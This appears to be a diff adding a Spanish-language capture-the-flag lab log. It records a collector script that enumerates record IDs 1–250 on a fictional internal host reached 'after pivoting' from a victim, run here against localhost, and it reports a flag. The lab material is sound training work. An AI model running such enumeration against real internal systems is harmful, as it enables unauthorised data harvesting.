@@ -1,0 +1,10 @@
+# Lab 08 — R5 (Parte D, Lautaro). Corrida del recolector contra el host interno.
+# Entorno: sandbox sin build de contenedores (Docker Hub bloqueado); se corre db/server.py directo
+# (= servicio del host interno). En el entorno real, esto se corre DESDE la victima tras pivotear.
+# Fecha: 2026-11-20T03:07:38Z UTC == 2026-11-20 00:07 -03
+# Python: Python 3.13.18
+
+$ python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250   # (base real en la victima)
+$ python3 recolector.py --base http://127.0.0.1    --desde 1 --hasta 250   # equivalente en sandbox:
+[*] Enumerando legajos 1..250 en http://127.0.0.1
+[+] Flag en el legajo id=187: FLAG{automation_pays_off}
